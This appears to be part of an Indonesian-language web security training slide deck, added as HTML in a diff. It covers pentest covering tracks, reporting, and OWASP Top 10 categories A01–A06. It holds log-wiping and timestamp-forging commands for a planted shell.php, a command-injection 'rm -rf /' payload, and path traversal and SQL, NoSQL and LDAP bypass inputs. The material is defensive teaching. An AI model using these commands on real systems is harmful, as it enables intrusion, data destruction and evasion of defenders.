+                        <li><strong>Clear History</strong> - Hapus command history</li>
+                    </ol>
+                </section>
+
+                <section>
+                    <h3>Praktek Fase 5: Covering Tracks - Langkah Detail</h3>
+                    <div class="code-block">
+<pre><code><span class="comment"># 1. Clean Apache Access Logs</span>
+<span class="comment"># Hapus entries yang mencurigakan</span>
+sed -i <span class="string">'/192.168.1.50/d'</span> /var/log/apache2/access.log
+
+<span class="comment"># Atau edit manual</span>
+nano /var/log/apache2/access.log
+
+<span class="comment"># 2. Clean Apache Error Logs</span>
+sed -i <span class="string">'/shell.php/d'</span> /var/log/apache2/error.log
+
+<span class="comment"># 3. Modify File Timestamps</span>
+<span class="comment"># Ubah timestamp file backdoor</span>
+touch -t 202001010000 /var/www/html/uploads/shell.php
+
+<span class="comment"># 4. Clear Command History</span>
+history -c
+<span class="function">rm</span> ~/.bash_history
+<span class="function">rm</span> ~/.mysql_history
+
+<span class="comment"># 5. Remove Temporary Files</span>
+<span class="function">rm</span> -rf /tmp/exploit*
+<span class="function">rm</span> -rf /tmp/shell*
+
+<span class="comment"># 6. Disable Logging (jika memungkinkan)</span>
+<span class="comment"># Hati-hati, ini bisa mencurigakan!</span></code></pre>
+                    </div>
+                </section>
+
+                <section>
+                    <h3>Praktek Fase 5: Covering Tracks - Verifikasi</h3>
+                    <div class="two-column">
+                        <div>
+                            <h4>Logs yang Dibersihkan:</h4>
+                            <ul style="font-size: 0.8em;">
+                                <li>Apache access.log ✓</li>
+                                <li>Apache error.log ✓</li>
+                                <li>Auth.log (jika ada) ✓</li>
+                                <li>Command history ✓</li>
+                            </ul>
+                        </div>
+                        <div>
+                            <h4>Files yang Dimodifikasi:</h4>
+                            <ul style="font-size: 0.8em;">
+                                <li>File timestamps diubah ✓</li>
+                                <li>Temporary files dihapus ✓</li>
+                                <li>Tools dihapus ✓</li>
+                                <li>No suspicious entries ✓</li>
+                            </ul>
+                        </div>
+                    </div>
+                    <div class="code-block" style="margin-top: 15px;">
+<pre><code><span class="comment"># Verifikasi log sudah bersih</span>
+grep -i <span class="string">"shell\|exploit\|backdoor"</span> /var/log/apache2/access.log
+<span class="comment"># Seharusnya tidak ada hasil</span>
+
+<span class="comment"># Check file timestamps</span>
+ls -la /var/www/html/uploads/shell.php
+<span class="comment"># Timestamp seharusnya sudah diubah</span></code></pre>
+                    </div>
+                </section>
+
+                <!-- Praktek Fase 6: Reporting -->
+                <section>
+                    <h3>Praktek Fase 6: Reporting</h3>
+                    <div class="info">
+                        <strong>Tujuan:</strong> Membuat dokumentasi lengkap tentang temuan dan rekomendasi
+                    </div>
+                    <h4>Langkah-langkah Praktek:</h4>
+                    <ol style="font-size: 0.85em;">
+                        <li><strong>Executive Summary</strong> - Ringkasan untuk manajemen</li>
+                        <li><strong>Technical Details</strong> - Detail teknis setiap vulnerability</li>
+                        <li><strong>Proof of Concept</strong> - Screenshot dan evidence</li>
+                        <li><strong>Risk Assessment</strong> - Penilaian risiko</li>
+                        <li><strong>Remediation</strong> - Rekomendasi perbaikan</li>
+                    </ol>
+                </section>
+
+                <section>
+                    <h3>Praktek Fase 6: Reporting - Template Laporan</h3>
+                    <div class="code-block">
+<pre><code><span class="comment"># PENETRATION TEST REPORT</span>
+<span class="comment"># Website: shop.example.com</span>
+<span class="comment"># Date: [Tanggal Testing]</span>
+<span class="comment"># Tester: [Nama]</span>
+
+<span class="comment">## 1. EXECUTIVE SUMMARY</span>
+- Overview: Penetration test dilakukan pada website e-commerce
+- Scope: shop.example.com dan subdomain terkait
+- Duration: [X] hari
+- Critical Findings: [X] critical, [Y] high, [Z] medium, [W] low
+
+<span class="comment">## 2. METHODOLOGY</span>
+- Reconnaissance: Google dorking, WHOIS, DNS lookup
+- Scanning: Nmap, Nikto, SSL scan
+- Exploitation: SQL injection, file upload, XSS
+- Post-exploitation: Backdoor, privilege escalation
+
+<span class="comment">## 3. FINDINGS</span>
+
+<span class="comment">### 3.1 SQL Injection (CRITICAL)</span>
+- Location: /login.php
+- Description: Login form vulnerable terhadap SQL injection
+- CVSS Score: 9.8 (Critical)
+- Proof of Concept:
+  - Screenshot 1: Login form
+  - Screenshot 2: SQL injection payload
+  - Screenshot 3: Successful bypass
+- Impact: Full database access, admin account compromise
+- Remediation:
+  1. Use prepared statements
+  2. Input validation
+  3. Parameterized queries
+
+<span class="comment">### 3.2 File Upload Vulnerability (HIGH)</span>
+- Location: /upload.php
+- Description: Unrestricted file upload allows PHP execution
+- CVSS Score: 8.5 (High)
+- Proof of Concept: [Screenshots]
+- Impact: Remote code execution
+- Remediation: [Steps]
+
+<span class="comment">## 4. RISK ASSESSMENT</span>
+- Critical: [X] vulnerabilities
+- High: [Y] vulnerabilities
+- Medium: [Z] vulnerabilities
+- Low: [W] vulnerabilities
+
+<span class="comment">## 5. RECOMMENDATIONS</span>
+- Immediate actions (Critical)
+- Short-term (High)
+- Long-term (Medium/Low)
+
+<span class="comment">## 6. APPENDIX</span>
+- Tools used
+- References
+- Contact information</code></pre>
+                    </div>
+                </section>
+
+                <section>
+                    <h3>Praktek Fase 6: Reporting - Checklist</h3>
+                    <div class="two-column">
+                        <div>
+                            <h4>Dokumentasi yang Harus Ada:</h4>
+                            <ul style="font-size: 0.8em;">
+                                <li>Executive summary ✓</li>
+                                <li>Methodology ✓</li>
+                                <li>Detailed findings ✓</li>
+                                <li>Screenshots untuk setiap PoC ✓</li>
+                                <li>CVSS scores ✓</li>
+                                <li>Risk assessment ✓</li>
+                                <li>Remediation steps ✓</li>
+                            </ul>
+                        </div>
+                        <div>
+                            <h4>Format Laporan:</h4>
+                            <ul style="font-size: 0.8em;">
+                                <li>PDF format</li>
+                                <li>Professional layout</li>
+                                <li>Clear sections</li>
+                                <li>Visual evidence</li>
+                                <li>Actionable recommendations</li>
+                                <li>Timeline untuk remediation</li>
+                            </ul>
+                        </div>
+                    </div>
+                    <div class="success" style="margin-top: 15px;">
+                        <strong>Tips:</strong> Gunakan tools seperti Dradis, Serpico, atau template profesional untuk membuat laporan yang konsisten
+                    </div>
+                </section>
+
+                <!-- Ringkasan Praktek -->
+                <section>
+                    <h3>Ringkasan Studi Kasus Praktis</h3>
+                    <table style="font-size: 0.65em;">
+                        <thead>
+                            <tr>
+                                <th>Fase</th>
+                                <th>Tools yang Digunakan</th>
+                                <th>Hasil Utama</th>
+                                <th>Dokumentasi</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td><strong>Reconnaissance</strong></td>
+                                <td>Google, WHOIS, DNS tools</td>
+                                <td>Domain info, subdomain, tech stack</td>
+                                <td>Screenshots, notes</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Scanning</strong></td>
+                                <td>Nmap, Nikto, SSLScan</td>
+                                <td>Open ports, services, vulnerabilities</td>
+                                <td>Scan results, reports</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Gaining Access</strong></td>
+                                <td>SQLMap, Burp Suite, Web shell</td>
+                                <td>SQL injection, file upload, shell access</td>
+                                <td>PoC screenshots, commands</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Maintaining Access</strong></td>
+                                <td>Cron, SSH keys, Web shells</td>
+                                <td>Backdoors, persistent access</td>
+                                <td>Configuration files</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Covering Tracks</strong></td>
+                                <td>sed, touch, rm</td>
+                                <td>Clean logs, modified timestamps</td>
+                                <td>Before/after logs</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Reporting</strong></td>
+                                <td>Dradis, Template, Screenshots</td>
+                                <td>Complete penetration test report</td>
+                                <td>PDF report dengan PoC</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </section>
+
+                <section>
+                    <h3>Tips untuk Praktek</h3>
+                    <div class="success">
+                        <h4>Best Practices:</h4>
+                        <ul style="font-size: 0.85em;">
+                            <li><strong>Legal Authorization:</strong> Selalu dapatkan izin tertulis sebelum testing</li>
+                            <li><strong>Document Everything:</strong> Screenshot, log, dan catat semua langkah</li>
+                            <li><strong>Use Lab Environment:</strong> Praktek di lab yang aman (DVWA, WebGoat, dll)</li>
+                            <li><strong>Follow Methodology:</strong> Ikuti fase-fase secara sistematis</li>
+                            <li><strong>Ethical Approach:</strong> Tujuan adalah meningkatkan security, bukan merusak</li>
+                        </ul>
+                    </div>
+                    <div class="info" style="margin-top: 20px;">
+                        <strong>Lab Environment untuk Praktek:</strong> DVWA (Damn Vulnerable Web Application), WebGoat, HackTheBox, TryHackMe, VulnHub
+                    </div>
+                </section>
+            </section>
+
+            <!-- 1.3 OWASP Top 10 -->
+            <section>
+                <section>
+                    <h2>1.3 Kinds of Attacks Based on Top 10 OWASP</h2>
+                    <p>OWASP Top 10 adalah daftar 10 risiko keamanan aplikasi web yang paling kritis</p>
+                    <div class="info" style="margin-top: 30px;">
+                        <strong>OWASP</strong> = Open Web Application Security Project<br>
+                        Dikeluarkan setiap 3-4 tahun berdasarkan data serangan aktual
+                    </div>
+                </section>
+
+                <section>
+                    <h3>OWASP Top 10 (2021)</h3>
+                    <ol style="font-size: 0.75em;">
+                        <li><strong>A01:</strong> Broken Access Control</li>
+                        <li><strong>A02:</strong> Cryptographic Failures</li>
+                        <li><strong>A03:</strong> Injection</li>
+                        <li><strong>A04:</strong> Insecure Design</li>
+                        <li><strong>A05:</strong> Security Misconfiguration</li>
+                        <li><strong>A06:</strong> Vulnerable and Outdated Components</li>
+                        <li><strong>A07:</strong> Identification and Authentication Failures</li>
+                        <li><strong>A08:</strong> Software and Data Integrity Failures</li>
+                        <li><strong>A09:</strong> Security Logging and Monitoring Failures</li>
+                        <li><strong>A10:</strong> Server-Side Request Forgery (SSRF)</li>
+                    </ol>
+                </section>
+
+                <!-- A01: Broken Access Control -->
+                <section>
+                    <h3>A01:2021 – Broken Access Control</h3>
+                    <p><strong>Deskripsi:</strong> Pengguna dapat mengakses data atau fungsi yang tidak seharusnya mereka akses</p>
+                    <div class="warning">
+                        <strong>Dampak:</strong> Akses tidak sah ke data sensitif, modifikasi data, penghapusan data
+                    </div>
+                    <div class="info" style="margin-top: 15px;">
+                        <strong>Prevalensi:</strong> 94% aplikasi web memiliki vulnerability ini (paling umum!)
+                    </div>
+                </section>
+
+                <section>
+                    <h3>A01: Broken Access Control - Penjelasan Detail</h3>
+                    <p>Access control menentukan apakah pengguna memiliki izin untuk melakukan tindakan tertentu. Ketika kontrol ini rusak:</p>
+                    <ul>
+                        <li>Pengguna dapat memodifikasi URL atau parameter untuk mengakses resource orang lain</li>
+                        <li>API tidak memverifikasi apakah pengguna memiliki hak akses</li>
+                        <li>Metadata exposure - aplikasi mengungkapkan informasi sensitif</li>
+                        <li>CORS misconfiguration memungkinkan domain tidak terpercaya mengakses API</li>
+                    </ul>
+                </section>
+
+                <section>
+                    <h3>A01: Broken Access Control - Contoh</h3>
+                    <p><strong>IDOR (Insecure Direct Object Reference):</strong></p>
+                    <div class="code-block">
+<pre><code><span class="comment">// Vulnerable URL</span>
+http://bank.com/account.php?id=12345
+http://bank.com/account.php?id=67890  <span class="comment">// Bisa akses akun orang lain!</span>
+
+<span class="comment">// Horizontal Privilege Escalation</span>
+http://ecommerce.com/order.php?user_id=100&order_id=500
+<span class="comment">// User biasa bisa lihat order user lain</span></code></pre>
+                    </div>
+                    <div class="info" style="margin-top: 15px;">
+                        <strong>Real-world:</strong> Facebook bug tahun 2018 memungkinkan pengguna melihat foto private pengguna lain dengan memodifikasi URL
+                    </div>
+                </section>
+
+                <section>
+                    <h3>A01: Broken Access Control - Contoh Kasus Real-World</h3>
+                    <div class="two-column">
+                        <div>
+                            <h4>1. Facebook Photo Bug (2018)</h4>
+                            <p style="font-size: 0.8em;">Pengguna dapat melihat foto private dengan memodifikasi URL parameter. 6.8 juta pengguna terpengaruh.</p>
+                        </div>
+                        <div>
+                            <h4>2. GitHub Access Token Leak (2017)</h4>
+                            <p style="font-size: 0.8em;">Token akses GitHub ter-expose melalui URL, memungkinkan akses ke repository private.</p>
+                        </div>
+                    </div>
+                    <div style="margin-top: 20px;">
+                        <h4>3. Panera Bread Data Breach (2018)</h4>
+                        <p style="font-size: 0.8em;">API tidak memverifikasi akses, memungkinkan siapa saja melihat data pelanggan termasuk nama, email, alamat, dan nomor telepon.</p>
+                    </div>
+                </section>
+
+                <section>
+                    <h3>A01: Broken Access Control - Contoh Lain</h3>
+                    <ul>
+                        <li><strong>Vertical Privilege Escalation:</strong> User biasa bisa akses admin panel</li>
+                        <li><strong>Path Traversal:</strong> Akses file di luar direktori yang diizinkan</li>
+                        <li><strong>CORS Misconfiguration:</strong> Domain tidak terpercaya bisa akses API</li>
+                    </ul>
+                    <div class="code-block">
+<pre><code><span class="comment">// Path Traversal</span>
+http://example.com/view.php?file=../../../etc/passwd
+
+<span class="comment">// CORS Misconfiguration</span>
+Access-Control-Allow-Origin: *</code></pre>
+                    </div>
+                </section>
+
+                <section>
+                    <h3>A01: Broken Access Control - Cara Mencegah</h3>
+                    <ul style="font-size: 0.9em;">
+                        <li>Selalu verifikasi authorization di setiap endpoint</li>
+                        <li>Gunakan access control list (ACL) atau role-based access control (RBAC)</li>
+                        <li>Jangan mengandalkan parameter yang dapat dimodifikasi user (IDOR)</li>
+                        <li>Implementasikan proper CORS policy</li>
+                        <li>Gunakan UUID atau random ID, bukan sequential ID</li>
+                        <li>Log semua akses yang ditolak untuk monitoring</li>
+                    </ul>
+                </section>
+
+                <!-- A02: Cryptographic Failures -->
+                <section>
+                    <h3>A02:2021 – Cryptographic Failures</h3>
+                    <p><strong>Deskripsi:</strong> Data sensitif tidak terenkripsi dengan benar atau menggunakan enkripsi yang lemah</p>
+                    <div class="warning">
+                        <strong>Dampak:</strong> Pencurian data sensitif (password, kartu kredit, data pribadi)
+                    </div>
+                    <div class="info" style="margin-top: 15px;">
+                        <strong>Catatan:</strong> Sebelumnya disebut "Sensitive Data Exposure" di OWASP Top 10 2017
+                    </div>
+                </section>
+
+                <section>
+                    <h3>A02: Cryptographic Failures - Penjelasan Detail</h3>
+                    <p>Kegagalan kriptografi terjadi ketika:</p>
+                    <ul>
+                        <li>Data sensitif tidak dienkripsi saat transit (HTTP bukan HTTPS)</li>
+                        <li>Data tidak dienkripsi saat disimpan (at rest)</li>
+                        <li>Menggunakan algoritma hash yang lemah (MD5, SHA-1)</li>
+                        <li>Password tidak di-hash dengan salt yang unik</li>
+                        <li>Kunci enkripsi yang lemah atau hardcoded</li>
+                        <li>Data sensitif muncul di log files atau error messages</li>
+                    </ul>
+                </section>
+
+                <section>
+                    <h3>A02: Cryptographic Failures - Contoh</h3>
+                    <div class="code-block">
+<pre><code><span class="comment">// Password dalam plaintext di database</span>
+<span class="keyword">INSERT INTO</span> users (username, password) 
+<span class="keyword">VALUES</span> (<span class="string">'admin'</span>, <span class="string">'password123'</span>);
+
+<span class="comment">// Menggunakan algoritma lemah</span>
+$hash = <span class="function">md5</span>($password);  <span class="comment">// MD5 sudah tidak aman!</span>
+
+<span class="comment">// Data tidak terenkripsi saat transit</span>
+http://example.com/login.php  <span class="comment">// Bukan HTTPS</span></code></pre>
+                    </div>
+                    <div class="info" style="margin-top: 15px;">
+                        <strong>Real-world:</strong> LinkedIn breach tahun 2012 - 6.5 juta password di-hash dengan SHA-1 tanpa salt, mudah di-crack
+                    </div>
+                </section>
+
+                <section>
+                    <h3>A02: Cryptographic Failures - Contoh Kasus Real-World</h3>
+                    <div class="two-column">
+                        <div>
+                            <h4>1. LinkedIn (2012)</h4>
+                            <p style="font-size: 0.75em;">6.5 juta password di-hash dengan SHA-1 tanpa salt. Password mudah di-crack menggunakan rainbow tables.</p>
+                        </div>
+                        <div>
+                            <h4>2. Adobe (2013)</h4>
+                            <p style="font-size: 0.75em;">153 juta user records dicuri. Password di-hash dengan algoritma lemah (3DES ECB), 38 juta dalam plaintext.</p>
+                        </div>
+                    </div>
+                    <div style="margin-top: 15px;">
+                        <h4>3. Yahoo (2013-2014)</h4>
+                        <p style="font-size: 0.75em;">3 miliar akun dicuri. Password di-hash dengan MD5 (sangat lemah). Merupakan salah satu breach terbesar dalam sejarah.</p>
+                    </div>
+                    <div style="margin-top: 15px;">
+                        <h4>4. Equifax (2017)</h4>
+                        <p style="font-size: 0.75em;">147 juta records dicuri termasuk SSN, kartu kredit. Data tidak terenkripsi dengan baik.</p>
+                    </div>
+                </section>
+
+                <section>
+                    <h3>A02: Cryptographic Failures - Contoh Lain</h3>
+                    <ul>
+                        <li>Menggunakan SSL/TLS versi lama (SSLv3, TLS 1.0)</li>
+                        <li>Kunci enkripsi yang lemah atau hardcoded</li>
+                        <li>Data sensitif di log files</li>
+                        <li>Kartu kredit disimpan tanpa enkripsi</li>
+                    </ul>
+                    <div class="code-block">
+<pre><code><span class="comment">// Hardcoded encryption key</span>
+<span class="keyword">define</span>(<span class="string">'ENCRYPTION_KEY'</span>, <span class="string">'12345678'</span>);  <span class="comment">// Sangat lemah!</span>
+
+<span class="comment">// Log sensitive data</span>
+<span class="function">error_log</span>(<span class="string">"User password: "</span> . $password);</code></pre>
+                    </div>
+                </section>
+
+                <section>
+                    <h3>A02: Cryptographic Failures - Cara Mencegah</h3>
+                    <ul style="font-size: 0.9em;">
+                        <li>Selalu gunakan HTTPS (TLS 1.2+) untuk data transit</li>
+                        <li>Enkripsi data sensitif saat disimpan (at rest)</li>
+                        <li>Gunakan algoritma hash yang kuat: bcrypt, Argon2, PBKDF2</li>
+                        <li>Selalu gunakan salt yang unik untuk setiap password</li>
+                        <li>Jangan hardcode encryption keys - gunakan key management</li>
+                        <li>Jangan log data sensitif (password, kartu kredit, SSN)</li>
+                        <li>Gunakan HSTS (HTTP Strict Transport Security)</li>
+                        <li>Disable weak cipher suites</li>
+                    </ul>
+                </section>
+
+                <!-- A03: Injection -->
+                <section>
+                    <h3>A03:2021 – Injection</h3>
+                    <p><strong>Deskripsi:</strong> Data tidak divalidasi dan memungkinkan eksekusi kode berbahaya</p>
+                    <div class="warning">
+                        <strong>Dampak:</strong> Akses database, eksekusi command, akses file system
+                    </div>
+                    <div class="info" style="margin-top: 15px;">
+                        <strong>Prevalensi:</strong> 19% aplikasi memiliki SQL injection vulnerability
+                    </div>
+                </section>
+
+                <section>
+                    <h3>A03: Injection - Penjelasan Detail</h3>
+                    <p>Injection terjadi ketika aplikasi mengirim data yang tidak terpercaya ke interpreter tanpa validasi:</p>
+                    <ul>
+                        <li><strong>SQL Injection:</strong> Menyuntikkan SQL code ke dalam query database</li>
+                        <li><strong>Command Injection:</strong> Mengeksekusi command sistem operasi</li>
+                        <li><strong>NoSQL Injection:</strong> Menyuntikkan query NoSQL (MongoDB, etc.)</li>
+                        <li><strong>LDAP Injection:</strong> Menyuntikkan query LDAP</li>
+                        <li><strong>XPath Injection:</strong> Menyuntikkan query XPath</li>
+                        <li><strong>XML Injection:</strong> Menyuntikkan XML code</li>
+                    </ul>
+                </section>
+
+                <section>
+                    <h3>A03: Injection - SQL Injection</h3>
+                    <div class="code-block">
+<pre><code><span class="comment">// Vulnerable Code</span>
+$query = <span class="string">"SELECT * FROM users 
+          WHERE username = '"</span> . $_POST[<span class="string">'username'</span>] . <span class="string">"'"</span>;
+
+<span class="comment">// Exploit</span>
+Username: admin<span class="string">' OR '1'='1</span>
+Password: anything
+
+<span class="comment">// Resulting Query</span>
+<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username = <span class="string">'admin' OR '1'='1'</span></code></pre>
+                    </div>
+                    <div class="info" style="margin-top: 15px;">
+                        <strong>Real-world:</strong> Sony Pictures hack tahun 2011 - SQL injection memungkinkan penyerang mengakses database dengan 1 juta user records
+                    </div>
+                </section>
+
+                <section>
+                    <h3>A03: Injection - Contoh Kasus Real-World</h3>
+                    <div class="two-column">
+                        <div>
+                            <h4>1. Sony Pictures (2011)</h4>
+                            <p style="font-size: 0.75em;">SQL injection memungkinkan akses ke 1 juta user records termasuk email dan password.</p>
+                        </div>
+                        <div>
+                            <h4>2. Heartland Payment Systems (2008)</h4>
+                            <p style="font-size: 0.75em;">SQL injection mengakibatkan 130 juta kartu kredit dicuri. Kerugian $140 juta.</p>
+                        </div>
+                    </div>
+                    <div style="margin-top: 15px;">
+                        <h4>3. TalkTalk (2015)</h4>
+                        <p style="font-size: 0.75em;">SQL injection memungkinkan akses ke 157,000 customer records. Denda £400,000.</p>
+                    </div>
+                    <div style="margin-top: 15px;">
+                        <h4>4. Equifax (2017)</h4>
+                        <p style="font-size: 0.75em;">Apache Struts vulnerability (injection-related) mengakibatkan 147 juta records dicuri.</p>
+                    </div>
+                </section>
+
+                <section>
+                    <h3>A03: Injection - Jenis Lain</h3>
+                    <div class="two-column">
+                        <div>
+                            <h4>Command Injection</h4>
+                            <div class="code-block">
+<pre><code><span class="function">exec</span>(<span class="string">"ping "</span> . $_GET[<span class="string">'host'</span>]);
+<span class="comment">// ?host=8.8.8.8; rm -rf /</span></code></pre>
+                            </div>
+                        </div>
+                        <div>
+                            <h4>NoSQL Injection</h4>
+                            <div class="code-block">
+<pre><code>{<span class="string">"username"</span>: {<span class="string">"$ne"</span>: <span class="keyword">null</span>}, 
+ <span class="string">"password"</span>: {<span class="string">"$ne"</span>: <span class="keyword">null</span>}}</code></pre>
+                            </div>
+                        </div>
+                    </div>
+                    <div style="margin-top: 20px;">
+                        <h4>LDAP Injection</h4>
+                        <div class="code-block">
+<pre><code><span class="comment">// Input: *)(uid=*))(|(uid=*</span>
+<span class="comment">// Bypasses authentication</span></code></pre>
+                        </div>
+                    </div>
+                </section>
+
+                <section>
+                    <h3>A03: Injection - Cara Mencegah</h3>
+                    <ul style="font-size: 0.9em;">
+                        <li>Gunakan <strong>Prepared Statements</strong> atau <strong>Parameterized Queries</strong></li>
+                        <li>Selalu validasi dan sanitize input dari user</li>
+                        <li>Gunakan whitelist untuk input validation</li>
+                        <li>Implementasikan least privilege untuk database user</li>
+                        <li>Escape special characters sebelum memproses input</li>
+                        <li>Gunakan ORM (Object-Relational Mapping) yang aman</li>
+                        <li>Jangan concatenate user input langsung ke query</li>
+                        <li>Gunakan stored procedures dengan parameter</li>
+                    </ul>
+                    <div class="code-block" style="margin-top: 15px;">
+<pre><code><span class="comment">// Safe: Prepared Statement</span>
+$stmt = $pdo-><span class="function">prepare</span>(<span class="string">"SELECT * FROM users WHERE username = ?"</span>);
+$stmt-><span class="function">execute</span>([$username]);
+
+<span class="comment">// Unsafe: String concatenation</span>
+$query = <span class="string">"SELECT * FROM users WHERE username = '$username'"</span>;</code></pre>
+                    </div>
+                </section>
+
+                <!-- A04: Insecure Design -->
+                <section>
+                    <h3>A04:2021 – Insecure Design</h3>
+                    <p><strong>Deskripsi:</strong> Desain aplikasi yang tidak aman dari awal, missing security controls</p>
+                    <div class="warning">
+                        <strong>Dampak:</strong> Kerentanan struktural yang sulit diperbaiki setelah development
+                    </div>
+                    <div class="info" style="margin-top: 15px;">
+                        <strong>Catatan:</strong> Kategori baru di OWASP Top 10 2021. Berbeda dengan implementation flaw - ini adalah design flaw.
+                    </div>
+                </section>
+
+                <section>
+                    <h3>A04: Insecure Design - Penjelasan Detail</h3>
+                    <p>Insecure design adalah kerentanan yang muncul dari arsitektur atau desain aplikasi yang tidak mempertimbangkan keamanan:</p>
+                    <ul>
+                        <li>Tidak ada threat modeling di fase design</li>
+                        <li>Missing security requirements dalam spesifikasi</li>
+                        <li>Business logic yang tidak mempertimbangkan security</li>
+                        <li>Tidak ada rate limiting atau throttling</li>
+                        <li>Desain yang memungkinkan bypass security controls</li>
+                        <li>Tidak ada defense in depth</li>
+                        <li>Missing security controls di level design</li>
+                    </ul>
+                </section>
+
+                <section>
+                    <h3>A04: Insecure Design - Contoh</h3>
+                    <ul>
+                        <li>Tidak ada rate limiting pada login</li>
+                        <li>Business logic yang tidak mempertimbangkan security</li>
+                        <li>Tidak ada validasi di level design</li>
+                        <li>Missing security requirements</li>
+                    </ul>
+                    <div class="code-block">
+<pre><code><span class="comment">// Tidak ada rate limiting</span>
+<span class="comment">// Attacker bisa brute force password tanpa batas</span>
+
+<span class="comment">// Business logic flaw</span>
+<span class="keyword">if</span> ($user-><span class="function">isPremium</span>()) {
+    <span class="comment">// Bisa di-exploit dengan mengubah flag di database</span>
+    <span class="function">showPremiumContent</span>();
+}</code></pre>
+                    </div>
+                    <div class="info" style="margin-top: 15px;">
+                        <strong>Real-world:</strong> Uber tahun 2017 - Desain yang memungkinkan bypass authentication dengan mengubah user type di database
+                    </div>
+                </section>
+
+                <section>
+                    <h3>A04: Insecure Design - Contoh Kasus Real-World</h3>
+                    <div class="two-column">
+                        <div>
+                            <h4>1. Uber (2017)</h4>
+                            <p style="font-size: 0.75em;">Desain aplikasi memungkinkan bypass authentication dengan mengubah user type di database. 57 juta user records terpengaruh.</p>
+                        </div>
+                        <div>
+                            <h4>2. Zoom (2020)</h4>
+                            <p style="font-size: 0.75em;">Desain yang memungkinkan "Zoom bombing" - tidak ada password default untuk meeting, tidak ada waiting room.</p>
+                        </div>
+                    </div>
+                    <div style="margin-top: 15px;">
+                        <h4>3. Facebook Cambridge Analytica (2018)</h4>
+                        <p style="font-size: 0.75em;">Desain API yang memungkinkan aplikasi pihak ketiga mengakses data pengguna tanpa persetujuan yang jelas. 87 juta pengguna terpengaruh.</p>
+                    </div>
+                    <div style="margin-top: 15px;">
+                        <h4>4. Twitter (2020)</h4>
+                        <p style="font-size: 0.75em;">Desain yang memungkinkan social engineering attack - tidak ada verifikasi untuk perubahan email/phone. Akun high-profile di-hack.</p>
+                    </div>
+                </section>
+
+                <section>
+                    <h3>A04: Insecure Design - Cara Mencegah</h3>
+                    <ul style="font-size: 0.9em;">
+                        <li>Lakukan <strong>Threat Modeling</strong> di fase design</li>
+                        <li>Definisikan security requirements sejak awal</li>
+                        <li>Gunakan secure design patterns dan principles</li>
+                        <li>Implementasikan rate limiting dan throttling</li>
+                        <li>Desain dengan prinsip <strong>defense in depth</strong></li>
+                        <li>Lakukan security review di fase design</li>
+                        <li>Gunakan established security frameworks</li>
+                        <li>Pertimbangkan security di setiap business logic</li>
+                    </ul>
+                </section>
+
+                <!-- A05: Security Misconfiguration -->
+                <section>
+                    <h3>A05:2021 – Security Misconfiguration</h3>
+                    <p><strong>Deskripsi:</strong> Konfigurasi default yang tidak aman atau error messages yang terlalu informatif</p>
+                    <div class="warning">
+                        <strong>Dampak:</strong> Ekspos informasi sistem, akses tidak sah ke fitur admin
+                    </div>
+                    <div class="info" style="margin-top: 15px;">
+                        <strong>Catatan:</strong> Sering terjadi karena developer tidak memahami konfigurasi security atau menggunakan default settings
+                    </div>
+                </section>
+
+                <section>
+                    <h3>A05: Security Misconfiguration - Penjelasan Detail</h3>
+                    <p>Security misconfiguration dapat terjadi di berbagai level:</p>
+                    <ul>
+                        <li><strong>Application Level:</strong> Debug mode enabled, verbose error messages</li>
+                        <li><strong>Web Server:</strong> Directory listing enabled, default pages exposed</li>
+                        <li><strong>Database:</strong> Default credentials, remote access enabled</li>
+                        <li><strong>Cloud:</strong> Public S3 buckets, open security groups</li>
+                        <li><strong>Framework:</strong> Default admin panels, sample applications</li>
+                        <li><strong>OS:</strong> Unnecessary services running, default passwords</li>
+                    </ul>
+                </section>
+
+                <section>
+                    <h3>A05: Security Misconfiguration - Contoh</h3>
+                    <div class="code-block">
+<pre><code><span class="comment">// Default credentials tidak diubah</span>
+Admin: admin / admin
+Database: root / (empty)
+
+<span class="comment">// Error messages terlalu detail</span>
+Error: SQL syntax error near <span class="string">'SELECT'</span> at line 1
+Database: mysql, User: root@localhost
+
+<span class="comment">// Directory listing enabled</span>
+http://example.com/uploads/  <span class="comment">// Bisa lihat semua file!</span>
+
+<span class="comment">// Debug mode enabled di production</span>
+DEBUG = <span class="keyword">True</span></code></pre>
+                    </div>
+                    <div class="info" style="margin-top: 15px;">
+                        <strong>Real-world:</strong> MongoDB databases tahun 2017 - Ribuan database MongoDB terbuka tanpa password karena konfigurasi default
+                    </div>
+                </section>
+
+                <section>
+                    <h3>A05: Security Misconfiguration - Contoh Kasus Real-World</h3>
+                    <div class="two-column">
+                        <div>
+                            <h4>1. MongoDB (2017)</h4>
+                            <p style="font-size: 0.75em;">Ribuan database MongoDB terbuka tanpa password karena konfigurasi default. 28,000+ database di-hack dan di-ransom.</p>
+                        </div>
+                        <div>
+                            <h4>2. Elasticsearch (2019)</h4>
+                            <p style="font-size: 0.75em;">Ribuan Elasticsearch instances terbuka tanpa authentication. 1.2 miliar records ter-expose.</p>
+                        </div>
+                    </div>
+                    <div style="margin-top: 15px;">
+                        <h4>3. Capital One (2019)</h4>
+                        <p style="font-size: 0.75em;">AWS S3 bucket misconfigured memungkinkan akses ke 100 juta records. Firewall rule yang salah.</p>
+                    </div>
+                    <div style="margin-top: 15px;">
+                        <h4>4. Facebook (2019)</h4>
+                        <p style="font-size: 0.75em;">419 juta phone numbers ter-expose karena database misconfigured tanpa password protection.</p>
+                    </div>
+                </section>
+
+                <section>
+                    <h3>A05: Security Misconfiguration - Cara Mencegah</h3>
+                    <ul style="font-size: 0.9em;">
+                        <li>Hapus atau ubah semua default credentials</li>
+                        <li>Disable debug mode di production</li>
+                        <li>Gunakan generic error messages (jangan expose system info)</li>
+                        <li>Disable directory listing</li>
+                        <li>Hapus sample applications dan default pages</li>
+                        <li>Gunakan security headers (HSTS, CSP, X-Frame-Options)</li>
+                        <li>Review dan harden semua konfigurasi</li>
+                        <li>Gunakan automated security scanning tools</li>
+                        <li>Implementasikan secure deployment process</li>
+                    </ul>
+                </section>
+
+                <!-- A06: Vulnerable Components -->
+                <section>
+                    <h3>A06:2021 – Vulnerable and Outdated Components</h3>
+                    <p><strong>Deskripsi:</strong> Menggunakan library, framework, atau komponen yang outdated atau memiliki known vulnerabilities</p>
